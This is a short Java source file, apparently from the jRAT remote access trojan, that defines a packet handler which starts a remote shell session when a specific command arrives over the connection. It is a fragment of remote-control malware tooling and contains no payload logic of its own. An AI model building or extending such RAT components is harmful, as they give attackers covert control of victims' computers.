package jrat.module.shell.packets;

import jrat.client.Connection;
import jrat.module.shell.RemoteShell;
import jrat.client.packets.incoming.IncomingPacket;

public class Packet23RemoteShellStart implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		new RemoteShell(con).start();
	}

}
